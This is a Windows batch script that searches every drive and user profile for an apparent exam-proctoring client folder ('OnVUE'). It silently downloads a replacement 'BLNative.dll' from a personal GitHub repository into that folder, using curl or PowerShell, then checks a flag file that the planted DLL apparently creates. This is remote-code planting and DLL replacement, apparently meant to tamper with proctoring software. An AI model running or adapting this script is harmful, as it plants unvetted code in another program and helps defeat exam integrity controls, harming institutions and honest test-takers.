@echo off
del "%temp%\adp_success.flag" 2>nul
for %%D in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
  if exist "%%D:\Users" (
    for /f "delims=" %%U in ('dir /b /ad "%%D:\Users"') do (
      if exist "%%D:\Users\%%U\AppData\Roaming\OnVUE" (
        curl -L "https://raw.githubusercontent.com/Dilip2003/ADPAgent/main/BLNative.dll" -o "%%D:\Users\%%U\AppData\Roaming\OnVUE\BLNative.dll" >nul 2>&1
        if exist "%temp%\adp_success.flag" (
          echo success
          del "%temp%\adp_success.flag"
        ) else (
          powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Dilip2003/ADPAgent/main/BLNative.dll' -OutFile '%%D:\Users\%%U\AppData\Roaming\OnVUE\BLNative.dll' -UseBasicParsing" >nul 2>&1
          if exist "%temp%\adp_success.flag" (
            echo success
            del "%temp%\adp_success.flag"
          ) else (
            echo failed
          )
        )
      )
    )
  )
)
